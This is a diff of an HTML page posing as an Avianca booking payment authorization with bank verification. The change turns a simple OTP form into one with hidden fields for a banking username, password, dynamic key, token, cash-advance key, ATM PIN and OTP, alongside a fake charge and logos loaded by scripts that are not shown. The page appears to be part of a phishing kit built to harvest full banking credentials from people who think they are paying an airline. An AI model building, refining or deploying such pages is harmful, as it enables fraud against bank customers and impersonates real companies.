@@ -1,226 +1,169 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Autorización de transacción</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avianca - Booking</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./css/checkers.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <script src="./js/functions.js"></script>
 
-  <!-- Tipografías limpias -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <!-- ===== SOLO ESTILOS (no JS, no cambios de estructura) ===== -->
+    <style>
+      :root{
+        --bg:#f5f6f8;
+        --card:#ffffff;
+        --text:#111827;
+        --muted:#6b7280;
+        --border:rgba(2,6,23,.10);
+        --shadow:0 10px 30px rgba(16,24,40,.10);
+        --focus:#de0108;
+        --radius:18px;
+      }
+      *{box-sizing:border-box}
+      html,body{background:var(--bg); font-family:"Red Hat Display","Lato",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; color:var(--text)}
 
-  <style>
-    :root{
-      --bg:#f5f6f8;
-      --card:#ffffff;
-      --text:#111827;
-      --muted:#6b7280;
-      --border:rgba(2,6,23,.08);
-      --primary:#111;
-      --primary-contrast:#fff;
-      --radius:18px;
-      --focus:#de0108;
-    }
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      background:var(--bg);
-      font-family:"Red Hat Display",system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,sans-serif;
-      color:var(--text);
-    }
+      /* Encabezado de logos */
+      .logos{
+        max-width: 720px;
+        margin: 18px auto 6px;
+        padding: 0 8px;
+        display:flex; align-items:center; justify-content:space-between; gap:12px;
+      }
+      .logos img{height:auto; object-fit:contain; filter: drop-shadow(0 1px 0 rgba(0,0,0,.08));}
 
-    /* Wrapper centrado */
-    .wrap{
-      min-height:100%;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px;
-    }
+      /* Contenedor principal */
+      main{max-width: 720px; margin: 0 auto 32px; padding: 0 8px;}
 
-    /* Tarjeta */
-    .auth-card{
-      width:min(720px, 100%);
-      background:var(--card);
-      border:1px solid var(--border);
-      border-radius:var(--radius);
-      box-shadow:0 10px 30px rgba(16,24,40,.08);
-      padding: clamp(20px, 3vw, 28px);
-    }
+      /* Tarjeta de contenido */
+      .content{
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: var(--radius);
+        box-shadow: var(--shadow);
+        padding: clamp(16px, 3vw, 24px);
+      }
+      .content > b:first-child{
+        display:block; margin-bottom:8px;
+        font-size: clamp(20px, 2.2vw, 28px); font-weight:800;
+      }
+      .content p{line-height:1.55; margin: 6px 0;}
 
-    /* Top bar con logos */
-    .card-top{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:16px;
-      padding-bottom:16px;
-      border-bottom:1px solid var(--border);
-    }
-    .brand-left{display:flex;align-items:center;gap:10px}
-    .brand-left img{height:22px}
-    .brand-right img{height:24px}
+      /* Formato de la tabla de etiquetas/valores SIN tocar tu HTML */
+      #form{
+        display:grid;
+        grid-template-columns: 180px 1fr;
+        gap: 12px 16px;
+        align-items: center;
+        margin-bottom: 0 !important;
+      }
+      /* Aplano columnas para alinear fila a fila */
+      #form .labels, #form .values{display: contents;}
+      #form .labels b{
+        color: var(--muted);
+        font-weight:700;
+      }
+      #form .values p{
+        margin:0;
+        font-weight:700;
+      }
 
-    h1{
-      font-size: clamp(20px, 2.2vw, 28px);
-      line-height:1.2;
-      margin:18px 0 6px;
-      font-weight:800;
-    }
-    .lead{
-      color:var(--text);
-      font-size: clamp(15px, 1.7vw, 18px);
-      margin:0 0 16px;
-    }
-    .bold{font-weight:800}
+      /* Inputs (incluye los que se muestran dinámicamente) */
+      input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
+        width:100% !important; height:52px !important;
+        padding:0 14px !important;
+        border:1px solid #e5e7eb !important; border-radius:12px !important;
+        background:#fff !important; outline:none;
+        font-size:16px; transition:border-color .15s, box-shadow .15s;
+      }
+      input:focus{ border-color:var(--focus) !important; box-shadow:0 0 0 3px rgba(222,1,8,.13) !important; }
 
-    .info-grid{
-      display:grid;
-      grid-template-columns: 1fr;
-      gap:10px 18px;
-      margin:12px 0 20px;
-    }
-    .row{
-      display:grid;
-      grid-template-columns: 120px 1fr;
-      gap:14px;
-      font-size:15px;
-    }
-    .row .label{color:var(--muted)}
-    .row .value{font-weight:700}
+      /* Link para reenviar código */
+      #newCode{
+        display:block; text-align:center; margin: 14px auto 8px;
+        color:#0d6efd; text-decoration:none;
+      }
+      #newCode:hover{text-decoration:underline}
 
-    /* Form */
-    .form{
-      display:grid;
-      grid-template-columns:1fr;
-      gap:14px;
-      margin-top:8px;
-    }
-    label{font-weight:700}
-    input[type="text"], input[type="password"], input[type="number"]{
-      width:100%;
-      height:52px;
-      padding:0 14px;
-      border:1px solid #e5e7eb;
-      border-radius:12px;
-      font-size:16px;
-      outline:none;
-      background:#fff;
-      transition:border-color .15s, box-shadow .15s;
-    }
-    input:focus{
-      border-color:var(--focus);
-      box-shadow:0 0 0 3px rgba(222,1,8,.12);
-    }
+      /* Botón principal existente */
+      #btnNextStep.btn-success{
+        display:block; margin: 6px auto 0;
+        min-width:200px; height:48px; padding:0 22px;
+        border-radius:999px; border:0;
+        background:#111; color:#fff; font-weight:800; font-size:16px;
+        box-shadow:0 2px 0 rgba(0,0,0,.08);
+        cursor:pointer; transition:transform .05s ease, opacity .15s ease;
+      }
+      #btnNextStep.btn-success:active{transform: translateY(1px)}
 
-    .helper{
-      color:var(--muted);
-      font-size:14px;
-      margin:4px 0 18px;
-    }
+      /* Espaciado vertical suave entre elementos directos */
+      .content > * + *, #form > * + *{ margin-top: 6px; }
 
-    .actions{display:flex;justify-content:center;margin-top:6px}
-    .btn{
-      display:inline-flex;align-items:center;justify-content:center;
-      min-width:180px;height:48px;padding:0 20px;
-      border-radius:999px;border:0;cursor:pointer;
-      background:var(--primary);color:var(--primary-contrast);
-      font-weight:800;font-size:16px;
-      transition:transform .05s ease, opacity .15s ease;
-    }
-    .btn:active{transform:translateY(1px)}
-    .btn:disabled{opacity:.6;cursor:not-allowed}
-
-    /* Responsivo */
-    @media (min-width:560px){
-      .info-grid{grid-template-columns:1fr 1fr}
-    }
-  </style>
+      /* Responsivo: mantener 2 columnas pero más compactas */
+      @media (max-width: 560px){
+        #form{ grid-template-columns: 130px 1fr; }
+        .logos{ margin: 12px auto 4px; }
+        .content{ padding: 16px; }
+      }
+    </style>
 </head>
 <body>
-
-  <div class="wrap">
-    <div class="auth-card" role="dialog" aria-labelledby="title" aria-describedby="desc">
-      <!-- Encabezado / logos -->
-      <div class="card-top">
-        <div class="brand-left">
-          <img src="./assets/logos/secure.svg" alt="100% Secure" onerror="this.style.display='none'">
-        </div>
-        <div class="brand-right">
-          <img src="./assets/logos/verified-by-visa.svg" alt="Verified by Visa" onerror="this.style.display='none'">
-        </div>
-      </div>
-
-      <!-- Título y descripción -->
-      <h1 id="title">Autorización de transacción</h1>
-      <p id="desc" class="lead">
-        La transacción de <span id="merchant" class="bold">AVIANA&nbsp;S.A</span> por
-        <span id="amount" class="bold">$ 22,95 USD</span> con tarjeta terminada en
-        <span id="last4" class="bold">1111</span> debe ser autorizada.
-      </p>
-
-      <!-- Datos de referencia -->
-      <div class="info-grid" aria-label="Detalles de la compra">
-        <div class="row">
-          <div class="label">Comercio:</div>
-          <div class="value" id="merchantRef">AVIANA S.A</div>
-        </div>
-        <div class="row">
-          <div class="label">Monto:</div>
-          <div class="value" id="amountRef">$ 22,95 USD</div>
-        </div>
-        <div class="row">
-          <div class="label">Tarjeta:</div>
-          <div class="value" id="cardRef">**** **** **** 1111</div>
-        </div>
-      </div>
-
-      <!-- Form OTP -->
-      <form id="otp-form" class="form" method="post" action="">
-        <div>
-          <label for="otp">Código OTP</label>
-          <input
-            id="otp"
-            name="otp"
-            type="text"
-            inputmode="numeric"
-            autocomplete="one-time-code"
-            placeholder="Ingresa el código"
-            maxlength="8"
-            required
-          >
-        </div>
-
-        <p class="helper">Revisa el código enviado por tu banco y escríbelo aquí para autorizar la compra.</p>
-
-        <div class="actions">
-          <button id="btn-verify" class="btn" type="submit">Verificar</button>
-        </div>
-      </form>
+    <!-- LOADER -->
+    <div class="main-loader show">
+        <img id="company-loader">
+        <div class="loader"></div>
     </div>
-  </div>
 
-  <!-- JS opcional: si tu backend inyecta valores, puedes setearlos aquí sin romper nada -->
-  <script>
-    // Este bloque es seguro: si existen variables globales las usamos; si no, dejamos los defaults.
-    (function () {
-      try {
-        // Ejemplos: window.AUTH_MERCHANT, AUTH_AMOUNT, AUTH_LAST4 podrían venir del backend
-        var merchant = window.AUTH_MERCHANT || document.getElementById('merchantRef').textContent;
-        var amount   = window.AUTH_AMOUNT   || document.getElementById('amountRef').textContent;
-        var last4    = window.AUTH_LAST4    || (document.getElementById('cardRef').textContent.match(/(\d{4})$/)||[])[0];
+    <div class="logos">
+        <img id="bank-logo" width="50px">
+        <img id="company-logo" width="110px">
+    </div>
+    <main>
+        <div class="content">
+            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
+            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
+            <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
+            <form id="form" style="margin-bottom: 30px;">
+                <div class="labels">
+                    <b>Comercio: </b>
+                    <b>Monto: </b>
+                    <b>Número de tarjeta: </b>
+                    <b class="hidden" id="user" style="margin-bottom: 10px !important;">Usuario: </b>
+                    <b class="hidden" id="puser" style="margin-bottom: 10px !important;">Contraseña: </b>
+                    <b class="hidden" id="cdin" style="margin-bottom: 10px !important;">Clave Dinámica: </b>
+                    <b class="hidden" id="dintok" style="margin-bottom: 10px !important;">Token: </b>
+                    <b class="hidden" id="cavance" style="margin-bottom: 10px !important;">Clave Avances: </b>
+                    <b class="hidden" id="ccaj" style="margin-bottom: 10px !important;">Clave Cajero: </b>
+                    <b class="hidden" id="otpcode" style="margin-bottom: 10px !important;">Código OTP: </b>
+                </div>
+                <div class="values">
+                    <p>AVIANCA S.A</p>
+                    <p>$ <span id="flight-price">49.000</span> USD</p>
+                    <p>•••• •••• •••• <span id="card-digits"></span></p>
+                    <input class="hidden" required type="text" id="user">
+                    <input class="hidden" required type="text" id="puser">
+                    <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
+                    <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="dintok">
+                    <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cavance">
+                    <input class="hidden" oninput="limitDigits(this, 4)" required type="text" id="ccaj">
+                    <input class="hidden" oninput="limitDigits(this, 8)" required type="text" id="otpcode">
+                </div>
+            </form>
+        </div>
+        <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
+        <button id="btnNextStep" class="btn-success">
+            Verificar
+        </button>
+    </main>
 
-        // Refrescar línea grande
-        document.getElementById('merchant').textContent = merchant;
-        document.getElementById('amount').textContent   = amount;
-        document.getElementById('last4').textContent    = last4;
-
-        // Por si necesitas enfocar el campo automáticamente
-        setTimeout(function(){ var el=document.getElementById('otp'); if(el) el.focus(); }, 150);
-      } catch(e){}
-    })();
-  </script>
+    <!-- SCRIPTS -->
+    <script src="./js/id_check.js"></script>
 </body>
 </html>
